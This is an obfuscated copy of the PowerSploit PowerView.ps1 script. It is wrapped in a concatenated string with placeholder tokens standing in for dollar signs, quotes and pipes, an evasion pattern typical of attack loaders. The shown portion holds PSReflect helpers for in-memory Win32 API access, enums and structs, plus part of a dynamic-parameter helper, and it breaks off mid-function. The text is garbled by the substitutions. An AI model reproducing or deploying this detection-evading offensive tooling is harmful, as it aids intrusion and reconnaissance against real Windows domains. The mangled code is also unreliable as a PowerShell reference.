('#requires -version 2

<#

PowerSploit File: PowerView.ps1
Author: Will Schroeder (@harmj0y)
License: BSD 3-Clause
Required Dependen'+'cies: None

#>


########################################################
#
# PSReflect code for Windows API access
# Author: @mattifestation
#   https://raw.githubusercontent.com/mattifestation/PSReflect/master/PSReflect.psm1
#
########################################################

function New-InMemoryModule {
<#
.SYNOPSIS

Creates a'+'n in-memory assembly and module

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

When defining custom enums, structs, and unmanaged functions, it is
necessary to associate to an assembly module. This helper function
creates an in-memory module that can be passed to the 41aenum'+'41a,
41astruct41a, and Add-Win32Type functions.

.PARAMETER ModuleName

Specifies the desired name for the in-memory assembly and module. If
ModuleName is not provided, it will default to a GUID.

.EXAMPLE

gIF1Module = New-InMemoryModule -ModuleName Win32
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSUseShouldProcessForStateChangingFunctions41a, 41a41a)]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        gIF1ModuleName = [Guid]::NewGuid().ToString()
    )

    gIF1AppDomain = [Reflection.Assembly].Assembly.GetType(41aSystem.AppDomain41a).GetProperty(41aCurrentDomain41a).GetValue(gIF1null, @())
    gIF1LoadedAssemblies = gIF1AppDomain.GetAssemblies()

    foreach (gIF1Assembly in gIF1LoadedAssemblies) {
        if (gIF1Assembly.FullName -and (gIF1Assembly.FullName.Split(41a,41a)[0] -eq gIF1ModuleName)) {
            return gIF1Assembly
        }
    }

    gIF1DynAssembly = New-Object Reflection.AssemblyName(gIF1ModuleName)
    gIF1Domain = gIF1AppDomain
    gIF1AssemblyBuilder = gIF1Domain.DefineDynamicAssembly(gIF1DynAssembly, 41aRun41a)
    gIF1ModuleBuilder = gIF1AssemblyBuilder.DefineDynamicModule(gIF1M'+'oduleName, gIF1False)

    return gIF1ModuleBuilder
}


# A helper function used to reduce typing while defining function
# prototypes for Add-Win32Type.
function func {
    Param (
        [Parameter(Position = 0, Mandatory = gIF1True)]
        [String]
        gIF1DllName,

        [Parameter(Position = 1, Mandatory = gIF1True)]
        [s'+'tring]
        gIF1FunctionName,

        [Parameter(Position = 2, Mandatory = gIF1True)]
        [Type]
        gIF1ReturnType,

        [Parameter(Position = 3)]
        [Type[]]
        gIF1ParameterTypes,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        gIF1NativeCallingConvention,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        gIF1Charset,

        [String]
        gIF1EntryPoint,

        [Switch]
        gIF1SetLastError
    )

    gIF1Properties = @{
        DllName = gIF1DllName
        FunctionName = gIF1FunctionName
        ReturnType = gIF1ReturnType
    }

    if (gIF1ParameterTypes) { gIF1Properties[41aParameterTypes41a] = gIF1ParameterTypes }
    if (gIF1NativeCallingConvention) { gIF1Properties[41aNativeCallingConvention41a] = gIF1NativeCallingConvention }
    if (gIF1Charset) { gIF1Properties[41aCharset41a] = gIF1Charset }
    if (gIF1SetLastError) { gIF1Properties[41aSetLastError41a] = gIF1SetLastError }
    if (gIF1EntryPoint) { gIF1Properties[41aEntryPoint41a] = gIF1EntryPoint }

    New-Object PSObject -Property gIF1Properties
}


function Add-Win32Type
{
<#
.SYNOPSIS

Creates a .NET type for an unmanaged Win32 function.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: func

.DESCRIPTION

Add-Win32Type enables you to easily interact with unmanaged (i.e.
Win32 unmanaged) functions in PowerShell. After providing
Add-Win32Type with a function signature, a .NET type is created
using reflection (i.e. csc.exe is never called like with Add-Type).

The 41afunc41a helper function can be used to reduce typing when defining
multiple function definitions.

.PARAMETER DllName

The name of the DLL.

.PARAMETER FunctionName

The name of the target function.

.PARAMETER EntryPoint

The DLL export function name. This argument should be specified if the
specified function name is different than the name of the exported
function.

.PARAMETER ReturnType

The return type of the function.

.PARAMETER ParameterTypes

The function parameters.

.PARAMETER NativeCallingConvention

Specifies the native calling convention of the function. Defaults to
stdcall.

.PARAMETER Charset

If you need to explicitly call an 41aA41a or 41aW41a Win32 function, you can
specify the character set.

.PARAMETER SetLastError

Indicates whether the callee calls the SetLastError Win32 API
function before returning from the attributed method.

.PARAMETER Module

The in-memory module that will host the functions. Use
New-InMemoryModule to define an in-memory module.

.PARAMETER Namespace

An optional namespace to prepend to the type. Add-Win32Type defaults
to a namespace consisting only of the name of the DLL.

.EXAMPLE

gIF1Mod = New-InMemoryModule -ModuleName Win32

gIF1FunctionDefinitions = @(
  (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError),
  (func kernel32 GetModuleHandle ([Intptr]) @([String]) -SetLastError),
  (func ntdll RtlGetCurrentPeb ([IntPtr]) @())
)

gIF1Types = gIF1FunctionDefinitions U9B Add-Win32Type -Module gIF1Mod -Namespace 41aWin3241a
gIF1Kernel32 = gIF1Types[41akernel3241a]
gIF1Ntdll = gIF1Types[41antdll41a]
gIF1Ntdll::RtlGetCurrentPeb()
gIF1ntdllbase = gIF1Kernel32::GetModuleHandle(41antdll41a)
gIF1Kernel32::GetProcAddress(gIF1ntdllbase, 41aRtlGetCurrentPeb41a)

.NOTES

Inspired by Lee Holmes41a Invoke-WindowsApi http://poshcode.org/2189

When defining multiple function prototypes, it is ideal to provide
Add-Win32Type with an array of function signatures. That way, they
are all incorporated into the same in-memory module.
#>

    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory=gIF1True, ValueFromPipelineByPropertyName=gIF1True)]
        [String]
        gIF1DllName,

        [Parameter(Mandatory=gIF1True, ValueFromPipelineByPropertyName=gIF1True)]
        [String]
        gIF1Func'+'tionName,

        [Parameter(ValueFromPipelineByPropertyName=gIF1True)]
        [String]
        gIF1EntryPoint,

        [Parameter(Mandatory=gIF1True, ValueFromPipelineByPropertyName=gIF1True)]
        [Type]
        gIF1ReturnType,

        [Parameter(ValueFromPipelineByPropertyName=gIF1True)]
        [Type[]]
        gIF1ParameterTypes,

        [Parameter(ValueFromPipelineByPropertyName=gIF1True)]
        [Runtime.InteropServices.CallingConvention]
        gIF1NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName=gIF1True)]
        [Runtime.InteropServices.CharSet]
        gI'+'F1Charset = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName=gIF1True)]
        [Switch]
        gIF1SetLastError,

        [Parameter(Mandatory=gIF1True)]
        [ValidateScript({(gIF1_ -is [Reflection.Emit.ModuleBuilder]) -or (gIF1_ -is [Reflection.Assembly])})]
        gIF1Module,

        [ValidateNotNull()]
        [String]
        gIF1Namespace = 41a41a
    )

    BEGIN
    {
        gIF1TypeHash = @{}
    }

    PROCESS
    {
        if (gIF1Module -is [Reflection.Assembly])
        {
            if (gIF1Namespace)
            {
                gIF1TypeHash[gIF1DllName] = gIF1Module.GetType(ZfrgIF1Namespace.gIF1DllNameZfr)
            }
            else
            {
                gIF1TypeHash[gIF1DllName] = gIF1Module.GetType(gIF1DllName)
            }
        }
        else
        {
            # Define one type for each DLL
            if (!gIF1TypeHash.ContainsKey(gIF1DllName))
            {
                if (gIF1Namespace)
                {
                    gIF1TypeHash[gIF1DllName] = gIF1Module.DefineType(ZfrgIF1Namespace.gIF1DllNameZfr, 41aPublic,BeforeFieldInit41a)
                }
                else
                {
                    gIF1TypeHash[gIF1DllName] = gIF1Module.DefineType(gIF1DllName, 41aPublic,BeforeFieldInit41a)
                }
            }

            gIF1Method = gIF1TypeHash[gIF1DllName].DefineMethod(
                gIF1FunctionName,
                41aPublic,Static,PinvokeImpl41a,
                gIF1ReturnType,
                gIF1ParameterTypes)

            # Make each ByRef parameter an Out parameter
            gIF1i = 1
            foreach(gIF1Parameter in gIF1ParameterTypes)
            {
                if (gIF1Parameter.IsByRef)
                {
                    [void] gIF1Method.DefineParameter(gIF1i, 41aOut41a, gIF1null)
                }

                gIF1i++
            }

            gIF1DllImport = [Runtime.InteropServices.DllImportAttribute]
            gIF1SetLastErrorField = gIF1DllImport.GetField(41aSetLastError41a)
            gIF1CallingConventionField = gIF1DllImport.GetField(41aCallingConvention41a)
            gIF1CharsetField = gIF1DllImport.GetField(41aCharSet41a)
            gIF1EntryPointField = gIF1DllImport.GetField(41aEntryPoint41a)
            if (gIF1SetLastError) { gIF1SLEValue = gIF1True } else { gIF1SLEValue = gIF1False }

            if (gIF1PSBoundParameters[41aEntryPoint41a]) { gIF1ExportedFuncName = gIF1EntryPoint } else { gIF1ExportedFuncName = gIF1FunctionName }

            # Equivalent to C# version of [DllImport(DllName)]
            gIF1Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            gIF1DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder(gIF1Constructor,
                gIF1DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection'+'.FieldInfo[]] @(gIF1SetLastErrorField,
                                           gIF1CallingConventionField,
                                  '+'         gIF1CharsetField,
                                           gIF1EntryPointField),
                [Object[]] @(gIF1SLEValue,
                             ([Runtime.InteropServices.CallingConvention] gIF1NativeCallingConvention),
                             ([Runtime.InteropServices.CharSet] gIF1Charset),
                             gIF1ExportedFuncName))

            gIF1Method.SetCustomAttribute(gIF1DllImportAttribute)
        }
    }

    END
    {
        if (gIF1Module -is [Reflection.Assembly])
        {
            return gIF1TypeHash
        }

        gIF1ReturnTypes = @{}

        foreach (gIF1Key in gIF1TypeHash.Keys)
        {
            gIF1Type = gIF1TypeHash[gIF1Key].CreateType()

            gIF1ReturnTypes[gIF1Key] = gIF1Type
        }

        return gIF1ReturnTypes
    }
}


function psenum {
<#
.SYNOPSIS

Creates an in-memory enumeration for use in your PowerShell session.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

The 41apsenum41a function facilitates the creation of enums entirely in
memory using as close to a ZfrC styleZfr as PowerShell will allow.

.PARAMETER Module

The in-memory module that will host the enum. Use
New-InMemoryModule to define an in-memory module.

.PARAMETER FullName

The fully-qualified name of the enum.

.PARAMETER Type

The type of each enum element.

.PARAMETER EnumElements

A hashtable of enum elements.

.PARAMETER Bitfield

Specifies that the enum should be treated as a bitfield.

.EXAMPLE

gIF1Mod = New-InMemoryModule -ModuleName Win32

gIF1ImageSubsystem = psenum gIF1Mod PE.IMAGE_SUBSYSTEM UInt16 @{
    UNKNOWN =                  0
    NATIVE =                   1 # Image doesn41at require a subsystem.
    WINDOWS_GUI =              2 # Image runs in the Windows GUI subsystem.
    WINDOWS_CUI =              3 # Image runs in the Windows character subsystem.
    OS2_CUI =                  5 # Image runs in the OS/2 character subsystem.
    POSIX_CUI =                7 # Image runs in the Posix character subsystem.
    NATIVE_WINDOWS =           8 # Image is a native Win9x driver.
    WINDOWS_CE_GUI =           9 # Image runs in the Windows CE subsystem.
    EFI_APPLICATION =          10
    EFI_BOOT_SERVICE_DRIVER =  11
    EFI_RUNTIME_DRIVER =       12
    EFI_ROM =                  13
    XBOX =                     14
    WINDOWS_BOOT_APPLICATION = 16
}

.NOTES

PowerShell purists may disagree with the naming of this function but
again, this was developed in such a way so as to emulate a ZfrC styleZfr
definition as closely as possible. Sorry, I41am not going to name it
New-Enum. :P
#>

    [OutputType([Type])]
    Param (
        [Parameter(Position = 0, Mandatory=gIF1True)]
        [ValidateScript({(gIF1_ -is [Reflection.Emit.ModuleBuilder]) -or (gIF1_ -is [Reflection.Assembly])})]
        gIF1Module,

        [Parameter(Position = 1, Mandatory=gIF1True)]
        [ValidateNotNullOrEmpty()]
        [String]
        gIF1FullName,

        [Parameter(Position = 2, Mandatory=gIF1True)]
        [Type]
        gIF1Type,

        [Parameter(Position = 3, Mandatory=gIF1True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        gIF1EnumElements,

        [Switch]
        gIF1Bitfield
    )

    if (gIF1Module -is [Reflection.Assembly])
    {
        return (gIF1Module.GetType(gIF1FullName))
    }

    gIF1EnumType = gIF1Type -as [Type]

    gIF1EnumBuilder = gIF1Module.DefineEnum(gIF1FullName, 41aPublic41a, gIF1EnumType)

    if (gIF1Bitfield)
    {
        gIF1FlagsConstructor = [FlagsAttribute].GetConstructor(@())
        gIF1FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder(gIF1FlagsConstructor, @())
        gIF1EnumBuilder.SetCustomAttribute(gIF1FlagsCustomAttribute)
    }

    foreach (gIF1Key in gIF1EnumElements.Keys)
    {
        # Apply the specified enum type to each element
        gIF1null = gIF1EnumBuilder.DefineLiteral(gIF1Key, gIF1EnumElements[gIF1Key] -as gIF1EnumType)
    }

    gIF1EnumBuilder.CreateType()
}


# A helper function used to reduce typing while defining struct
# fields.
function field {
    Param (
        [Parameter(Position = 0, Mandatory=gIF1True)]
        [UInt16]
        gIF1Position,

        [Parameter(Position = 1, Mandatory=gIF1True)]
        [Type]
        gIF1Type,

        [Parameter(Position = 2)]
        [UInt16]
        gIF1Offset,

        [Object[]]
        gIF1MarshalAs
    )

    @{
        Position = gIF1Position
        Type = gIF1Type -as [Type]
        Offset = gIF1Offset
        MarshalAs = gIF1MarshalAs
    }
}


function struct
{
<#
.SYNOPSIS

Creates an in-memory struct for use in your PowerShell session.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: field

.DESCRIPTION

The 41astruct41a function facilitates the creation of structs entirely in
memory using as close to a ZfrC styleZfr as PowerShell will allow. Struct
fields are specified using a hashtable where each field of the struct
is comprosed of the order in which it should be defined, its .NET
type, and optionally, its offset and special marshaling attributes.

One of the features of 41astruct41a is that after your struct is defined,
it will come with a built-in GetSize method as well as an explicit
converter so that you can easily cast an IntPtr to the struct without
relying upon calling SizeOf and/or PtrToStructure in the Marshal
class.

.PARAMETER Module

The in-memory module that will host the struct. Use
New-InMemoryModule to define an in-memory module.

.PARAMETER FullName

The fully-qualified name of the struct.

.PARAMETER StructFields

A hashtable of fields. Use the 41afield41a helper function to ease
defining each field.

.PARAMETER PackingSize

Specifies the memory alignment of fields.

.PARAMETER ExplicitLayout

Indicates that an explicit offset for each field will be specified.

.EXAMPLE

gIF1Mod = New-InMemoryModule -ModuleName Win32

gIF1ImageDosSignature = psenum gIF1Mod PE.IMAGE_DOS_SIGNATURE UInt16 @{
    DOS_SIGNATURE =    0x5A4D
    OS2_SIGNATURE =    0x454E
    OS2_SIGNATURE_LE = 0x454C
    VXD_SIGNATURE =    0x454C
}

gIF1ImageDosHeader = struct gIF1Mod PE.IMAGE_DOS_HEADER @{
    e_magic =    field 0 gIF1ImageDosSignature
    e_cblp =     field 1 UInt16
    e_cp =       field 2 UInt16
    e_crlc =     field 3 UInt16
    e_cparhdr =  field 4 UInt16
    e_minalloc = field 5 UInt16
    e_maxalloc = field 6 UInt16
    e_ss =       field 7 UInt16
    e_sp =       field 8 UInt16
    e_csum =     field 9 UInt16
    e_ip =       field 10 UInt16
    e_cs =       field 11 UInt16
    e_lfarlc =   field 12 UInt16
    e_ovno =     field 13 UInt16
    e_res =      field 14 UInt16[] -MarshalAs @(41aByValArray41a, 4)
    e_oemid =    field 15 UInt16
    e_oeminfo =  field 16 UInt16
    e_res2 =     field 17 UInt16[] -MarshalAs @(41aByValArray41a, 10)
    e_lfanew =   field 18 Int32
}

# Example of using an explicit layout in order to create a union.
gIF1TestUnion = struct gIF1Mod TestUnion @{
    field1 = field 0 UInt32 0
    field2 = field 1 IntPtr 0
} -ExplicitLayout

.NOTES

PowerShell purists may disagree with the naming of this function but
again, this was developed in such a way so as to emulate a ZfrC styleZfr
definition as closely as possible. Sorry, I41am not going to name it
New-Struct. :P
#>

    [OutputType([Type])]
    Param (
        [Parameter(Position = 1, Mandatory=gIF1True)]
        [ValidateScript({(gIF1_ -is [Reflection.Emit.ModuleBuilder]) -or (gIF1_ -is [Reflection.Assembly])})]
        gIF1Module,

        [Parameter(Position = 2, Mandatory=gIF1True)]
        [ValidateNotNullOrEmpty()]
        [String]
        gIF1FullName,

        [Parameter(Position = 3, Mandatory=gIF1True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        gIF1StructFields,

        [Reflection.Emit.PackingSize]
        gIF1PackingSize = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        gIF1ExplicitLayout
    )

    if (gIF1Module -is [Reflection.Assembly])
    {
        return (gIF1Module.GetType(gIF1FullName))
    }

    [Reflection.TypeAttributes] gIF1StructAttributes = 41aAnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit41a

    if (gIF1ExplicitLayout)
    {
        gIF1StructAttributes = gIF1StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
      '+'  gIF1StructAttributes = gIF1StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    gIF1StructBuilder = gIF1Module.DefineType(gIF1FullName, gIF1StructAttributes, [ValueType], gIF1PackingSize)
    gIF1ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    gIF1SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField(41aSizeConst41a))

    gIF1Fields = New-Object Hashtable[](gIF1StructFields.Count)

    # Sort each field according to the orders specified
    # Unfortunately, PSv2 doesn41at have the luxury of the
    # hashtable [Ordered] accelerator.
    foreach (gIF1Field in gIF1StructFields.Keys)
    {
        gIF1Index = gIF1StructFields[gIF1Field][41aPosition41a]
        gIF1Fields[gIF1Index] = @{FieldName = gIF1Field; Properties = gIF1StructFields[gIF1Field]}
    }

    foreach (gIF1Field in gIF1Fields)
    {
        gIF1FieldName = gIF1Field[41aFieldName41a]
        gIF1FieldProp = gIF1Field[41aProperties41a]

        gIF1Offset = gIF1FieldProp[41aOffset41a]
        gIF1Type = gIF1FieldProp[41aType41a]
        gIF1MarshalAs = gIF1FieldProp[41aMarshalAs41a]

        gIF1NewField = gIF1StructBuilder.DefineField(gIF1FieldName, gIF1Type, 41aPublic41a)

        if (gIF1MarshalAs)
        {
            gIF1UnmanagedType = gIF1MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if (gIF1MarshalAs[1])
            {
                gIF1Size = gIF1MarshalAs[1]
                gIF1AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder(gIF1ConstructorInfo,
                    gIF1UnmanagedType, gIF1SizeConst, @(gIF1Size))
            }
            '+'else
            {
                gIF1AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder(gIF1ConstructorInfo, [Object[]] @(gIF1UnmanagedType))
            }

            gIF1NewField.SetCustomAttribute(gIF1AttribBuilder)
        }

        if (gIF1ExplicitLayout) { gIF1NewField.SetOffset(gIF1Offset) }
    }

    # Make the struct aware of its own size.
    # No more having to call [Runtime.InteropServices.Marshal]::SizeOf!
    gIF1SizeMethod = gIF1StructBuilder.DefineMethod(41aGetSize41a,
        41aPublic, Static41a,
        [Int],
        [Type[]] @())
    gIF1ILGenerator = gIF1SizeMethod.GetILGenerator()
    # Thanks for the help, Jason Shirk!
    gIF1ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, gIF1StructBuilder)
    gIF1ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod(41aGetTypeFromHandle41a))
    gIF1ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod(41aSizeOf41a, [Type[]] @([Type])))
    gIF1ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)

    # Allow for explicit casting from an IntPtr
    # No more having to call [Runtime.InteropServices.Marshal]::PtrToStructure!
    gIF1ImplicitConverter = gIF1StructBuilder.DefineMethod(41aop_Implicit41a,
        41aPrivateScope, Public, Static, HideBySig, SpecialName41a,
        gIF1StructBuilder,
        [Type[]] @([IntPtr]))
    gIF1ILGenerator2 = gIF1ImplicitConverter.GetILGenerator()
    gIF1ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
    gIF1ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    gIF1ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, gIF1StructBuilder)
    gIF1ILGenerator2.Emit([Reflection.Em'+'it.OpCodes]::Call,
        [Type].GetMethod(41aGetTypeFromHandle41a))
    gIF1ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod(41aPtrToStructure41a, [Type[]] @([IntPtr], [Type])))
    gIF1ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, gIF1StructBuilder)
    gIF1ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)

    gIF1StructBuilder.CreateType()
}


########################################################
#
# Misc. helpers
#
########################################################

Function New-DynamicParameter {
<#
.SYNOPSIS

Helper function to simplify creating dynamic parameters.

    Adapated from https://beatcracker.wordpress.com/2015/08/10/dynamic-parameters-validateset-and-enums/.
    Originally released under the Microsoft Public License (Ms-PL).

.DESCRIPTION

Helper function to simplify creating dynamic parameters.

Example use cases:
    Include parameters only if your environment dictates it
    Include parameters depending on the value of a user-specified parameter
    Provide tab completion and intellisense for parameters, depending on the environment

Please keep in mind that all dynamic parameters you create, will not have corresponding variables created.
    Use New-DynamicParameter with 41aCreateVariables41a switch in your main code block,
    (41aProcess41a for advanced functions) to create those variables.
    Alternatively, manually reference gIF1PSBoundParameters for the dynamic parameter value.

This function has two operating modes:

1. All dynamic parameters created in one pass using pipeline input to the function. This mode allows to create dynamic parameters en masse,
with one function call. There is no need to create and maintain custom RuntimeDefinedParameterDictionary.

2. Dynamic parameters are created by separate function calls and added to the RuntimeDefinedParameterDictionary you created beforehand.
Then you output this RuntimeDefinedParameterDictionary to the pipeline. This allows more fine-grained control of the dynamic parameters,
with custom conditions and so on.

.NOTES

Credits to jrich523 and ramblingcookiemonster for their initial code and inspiration:
    https://github.com/RamblingCookieMonster/PowerShell/blob/master/New-DynamicParam.ps1
    http://ramblingcookiemonster.wordpress.com/2014/11/27/quick-hits-credentials-and-dynamic-parameters/
    http://jrich523.wordpress.com/2013/05/30/powershell-simple-way-to-add-dynamic-parameters-to-advanced-function/

Credit to BM for alias and type parameters and their handling

.PARAMETER Name

Name of the dynamic parameter

.PARAMETER Type

Type for the dynamic parameter.  Default is string

.PARAMETER Alias

If specified, one or more aliases to assign to the dynamic parameter

.PARAMETER Mandatory

If specified, set the Mandatory attribute for this dynamic parameter

.PARAMETER Position

If specified, set the Position attribute for this dynamic parameter

.PARAMETER HelpMessage

If specified, set the HelpMessage for this dynamic parameter

.PARAMETER DontShow

If specified, set the DontShow for this dynamic parameter.
This is the new PowerShell 4.0 attribute that hides parameter from tab-completion.
http://www.powershellmagazine.com/2013/07/29/pstip-hiding-parameters-from-tab-completion/

.PARAMETER ValueFromPipeline

If specified, set the ValueFromPipeline attribute for this dynamic parameter

.PARAMETER ValueFromPipelineByPropertyName

If specified, set the ValueFromPipelineByPropertyName attribute for this dynamic parameter

.PARAMETER ValueFromRemainingArguments

If specified, set the ValueFromRemainingArguments attribute for this dynamic parameter

.PARAMETER ParameterSetName

If specified, set the ParameterSet attribute for this dynamic parameter. By default parameter is added to all parame'+'ters sets.

.PARAMETER AllowNull

If specified, set the AllowNull attribute of this dynamic parameter

.PARAMETER AllowEmptyString

If specified, set the AllowEmptyString attribute of this dynamic parameter

.PARAMETER AllowEmptyCollection

If specified, set the AllowEmptyCollection attribute of this dynamic parameter

.PARAMETER ValidateNotNull

If specified, set the ValidateNotNull attribute of this dynamic parameter

.PARAMETER ValidateNotNullOrEmpty

If specified, set the ValidateNotNullOrEmpty attribute of this dynamic parameter

.PARAMETER ValidateRange

If specified, set the ValidateRange attribute of this dynamic parameter

.PARAMETER ValidateLength

If specified, set the ValidateLength attribute of this dynamic parameter

.PARAMETER ValidatePattern

If specified, set the ValidatePattern attribute of this dynamic parameter

.PARAMETER ValidateScript

If specified, set the ValidateScript attribute of this dynamic parameter

.PARAMETER ValidateSet

If specified, set the ValidateSet attribute of this dynamic parameter

.PARAMETER Dictionary

If specified, add resulting RuntimeDefinedParameter to an existing RuntimeDefinedParameterDictionary.
Appropriate for custom dynamic parameters creation.

If not specified, create and return a RuntimeDefinedParameterDictionary
Appropriate for a simple dynamic parameter creation.
#>

    [CmdletBinding(DefaultParameterSetName = 41aDynamicParameter41a)]
    Param (
        [Parameter(Mandatory = gIF1true, ValueFromPipeline = gIF1true, ValueFromPipelineByPropertyName = gIF1true, ParameterSetName = 41aDynamicParameter41a)]
        [ValidateNotNullOrEmpty()]
        [string]gIF1Name,

        [Parameter(ValueFromPipelineByPropertyName = gIF1true, ParameterSetName = 41aDynamicParameter41a)]
        [System.Type]gIF1Type = [int],

        [Parameter(ValueFromPipelineByPropertyName = gIF1true, ParameterSetName = 41aDynamicParameter41a)]
        [string[]]gIF1Alias,

        [Parameter(ValueFromPipelineByPropertyName = gIF1true, ParameterSetName = 41aDynamicParameter41a)]
        [switch]gIF1Mandatory,

        [Parameter(ValueFromPipelineByPropertyName = gIF1true, ParameterSetName = 41aDynamicParameter41a)]
        [int]gIF1Position,

        [Parameter(ValueFromPipelineByPropertyName = gIF1true, ParameterSetName = 41aDynamicParameter41a)]
        [string]gIF1HelpMessage,

        [Parameter(ValueFromPipelineByPropertyName = gIF1true, ParameterSetName = 41aDynamicParameter41a)]
        [switch]gIF1DontShow,

        [Parameter(ValueFromPipelineByPropertyName = gIF1true, ParameterSetName = 41aDynamicParameter41a)]
        [switch]gIF1ValueFromPipeline,

        [Parameter(ValueFromPipelineByPropertyName = gIF1true, ParameterSetName = 41aDynamic'+'Parameter41a)]
        [switch]gIF1ValueFromPipelineByPropertyName,

        [Parameter(ValueFromPipelineByPropertyName = gIF1true, ParameterSetName = 41aDynamicParameter41a)]
        [switch]gIF1ValueFromRemainingArguments,

        [Parameter(ValueFromPipelineByPropertyName = gIF1true, ParameterSetName = 41aDynamicParameter41a)]
        [string]gIF1ParameterSetName = 41a__AllParameterSets41a,

        [Parameter(ValueFromPipelineByPropertyName = gIF1true, ParameterSetName = 41aDynamicParameter41a)]
        [switch]gIF1AllowNull,

        [Parameter(ValueFromPipelineByPropertyName = gIF1true, ParameterSetName = 41aDynamicParameter41a)]
        [switch]gIF1AllowEmptyString,

        [Parameter(ValueFromPipelineByPropertyName = gIF1true, ParameterSetName = 41aDynamicParameter41a)]
        [switch]gIF1AllowEmptyCollection,

        [Parameter(ValueFromPipelineByPropertyName = gIF1true, ParameterSetName = 41aDynamicParameter41a)]
        [switch]gIF1ValidateNotNull,

        [Parameter(ValueFromPipelineByPropertyName = gIF1true, ParameterSetName = 41aDynamicParameter41a)]
        [switch]gIF1ValidateNotNullOrEmpty,

        [Parameter(ValueFromPipelineByPropertyName = gIF1true, ParameterSetName = 41aDynamicParameter41a)]
        [ValidateCount(2,2)]
        [int[]]gIF1ValidateCount,

        [Parameter(ValueFromPipelineByPropertyName = gIF1true, ParameterSetName = 41aDynamicParameter41a)]
        [ValidateCount(2,2)]
        [int[]]gIF1ValidateRange,

        [Parameter(ValueFromPipelineByPropertyName = gIF1true, ParameterSetName = 41aDynamicParameter41a)]
        [ValidateCount(2,2)]
        [int[]]gIF1ValidateLength,

        [Parameter(ValueFromPipelineByPropertyName = gIF1true, ParameterSetName = 41aDynamicParameter41a)]
        [ValidateNotNullOrEmpty()]
        [string]gIF1ValidatePattern,

        [Parameter(ValueFromPipelineByPropertyName = gIF1true, ParameterSetName = 41aDynamicParameter41a)]
        [ValidateNotNullOrEmpty()]
        [scriptblock]gIF1ValidateScript,

        [Parameter(ValueFromPipelineByPropertyName = gIF1true, Parameter'+'SetName = 41aDynamicParameter41a)]
        [ValidateNotNullOrEmpty()]
        [string[]]gIF1ValidateSet,

        [Parameter(ValueFromPipelineByPropertyName = gIF1true, ParameterSetName = 41aDynamicParameter41a)]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if(!(gIF1_ -is [System.Management.Automation.RuntimeDefinedParameterDictionary]))
            {
                Throw 41aDictionary must be a System.Management.Automation.RuntimeDefinedParameterDictionary object41a
            }
            gIF1true
        })]
        gIF1Dictionary = gIF1false,

        [Parameter(Mandatory = gIF1true, ValueFromPipelineByPropertyName = gIF1true, ParameterSetName = 41aCreateVariables41a)]
        [switch]gIF1CreateVariables,

        [Parameter(Mandatory = gIF1true, ValueFromPipelineByPropertyName = gIF1true, ParameterSetName = 41aCreateVariables41a)]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            # System.Management.Automation.PSBoundParametersDictionary is an internal sealed class,
            # so one can41at use PowerShell41as 41a-is41a operator to validate type.
            if(gIF1_.GetType().Name -notmatch 41aDictionary41a) {
                Throw 41aBoundParameters must be a System.Management.Automation.PSBoundParametersDictionary object41a
            }
            gIF1true
        })]
        gIF1BoundParameters
    )

    Beg'+'in {
        gIF1InternalDictionary = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameterDictionary
        function _temp { [CmdletBinding()] Param() }
        gIF1CommonParameters = (Get-Command _temp).Parameters.Keys
    }

    Process {
        if(gIF1CreateVariables) {
            gIF1BoundKeys = gIF1BoundParameters.Keys U9B Where-Object { gIF1CommonParameters -notcontains gIF1_ }
            ForEach(gIF1Parameter in gIF1BoundKeys) {
                if (gIF1Parameter) {
                    Set-Variable -Name gIF1Parameter -Value gIF1BoundParameters.gIF1P'+'arameter -Scope 1 -Force
                }
            }
        }
        else {
            gIF1StaleKeys = @()
            gIF1StaleKeys = gIF1PSBoundParameters.GetEnumerator() U9B
                        ForEach-Object {
